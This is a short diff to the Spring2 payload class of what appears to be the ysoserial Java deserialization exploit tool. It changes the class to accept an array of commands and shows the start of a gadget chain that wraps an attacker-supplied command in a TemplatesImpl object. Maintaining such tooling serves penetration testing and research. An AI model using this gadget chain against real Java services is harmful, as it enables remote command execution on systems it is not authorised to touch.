@@ -43,9 +43,9 @@ import ysoserial.payloads.util.Reflections;
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 } )
 @Authors({ Authors.MBECHLER })
-public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
+public class Spring2 extends ExtendedObjectPayload<Object> {
 
-    public Object getObject ( final String command ) throws Exception {
+    public Object getObject ( final String[] command ) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
 
         AdvisedSupport as = new AdvisedSupport();
